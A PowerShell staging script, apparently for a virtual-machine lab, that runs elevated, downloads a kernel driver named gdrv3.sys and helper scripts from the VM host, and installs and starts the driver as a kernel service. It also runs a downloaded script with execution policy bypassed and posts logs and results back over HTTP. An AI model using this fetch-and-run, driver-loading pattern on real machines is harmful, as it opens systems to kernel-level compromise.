# stage2.ps1 - runs ELEVATED in the guest. Fetch payload, install gdrv3, run ping, post results.
$d = Join-Path $env:TEMP 'p37vm'
$base = 'http://10.0.2.2:8080'
$log = "$d\stage2.log"
$ErrorActionPreference = 'Continue'
function P([string]$m) { Write-Host $m; Add-Content -LiteralPath $log -Value ('{0} {1}' -f (Get-Date -f 'HH:mm:ss'), $m) }
Set-Content -LiteralPath $log -Value ('stage2 start ' + $env:COMPUTERNAME + ' ' + [Environment]::OSVersion.Version)
New-Item -ItemType Directory -Force -Path $d | Out-Null

function Post([string]$tag, [string]$body) {
    try { (New-Object Net.WebClient).UploadString("$base/log", ("## " + $tag + "`r`n" + $body)); P ('posted ' + $tag) }
    catch { P ('post FAIL ' + $tag + ': ' + $_.Exception.Message) }
}

P ('whoami=' + (whoami.exe))
P ('admin=' + ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
P ('build=' + (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild)

foreach ($f in 'gdrv3.sys', 'p37_prov.cs', '_p37_ping.ps1') {
    try { (New-Object Net.WebClient).DownloadFile("$base/$f", "$d\$f"); P ('get ' + $f + ' ok ' + (Get-Item "$d\$f").Length) }
    catch { P ('get ' + $f + ' FAIL ' + $_.Exception.Message) }
}
if (-not (Test-Path "$d\gdrv3.sys") -or -not (Test-Path "$d\p37_prov.cs")) { Post 'stage2-partial' (Get-Content -LiteralPath $log -Raw); P 'abort: payload missing' }
else {
    Post 'stage2-partial' (Get-Content -LiteralPath $log -Raw)

    $scOut = @()
    $scOut += (& sc.exe create gdrv3 type= kernel binPath= "$d\gdrv3.sys" start= demand 2>&1)
    $scOut += (& sc.exe start gdrv3 2>&1)
    Start-Sleep -Seconds 1
    $scOut += (& sc.exe query gdrv3 2>&1)
    $scRes = $scOut -join ' | '
    P ('sc: ' + $scRes)
    Post 'sc' $scRes

    $sig = (Get-AuthenticodeSignature "$d\gdrv3.sys")
    Post 'sig' (((& certutil.exe -hashfile "$d\gdrv3.sys" SHA256 2>&1) -join ' | ') + ' status=' + $sig.Status + ' signer=' + $sig.SignerCertificate.Subject)
    P ('hash=' + ((Get-FileHash "$d\gdrv3.sys" -Algorithm SHA256).Hash))

    P 'running ping'
    $pingOut = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$d\_p37_ping.ps1" 2>&1
    P ('ping exit=' + $LASTEXITCODE)
    if (Test-Path "$d\_p37_ping.txt") { Post 'ping' (Get-Content -LiteralPath "$d\_p37_ping.txt" -Raw); Get-Content -LiteralPath "$d\_p37_ping.txt" | Write-Host }
    else { Post 'ping-missing' ($pingOut -join "`r`n"); Write-Host ($pingOut -join "`r`n") }

    Post 'stage2' (Get-Content -LiteralPath $log -Raw)
    Add-Content -LiteralPath $log -Value 'stage2 end'
    P 'stage2 end'
}
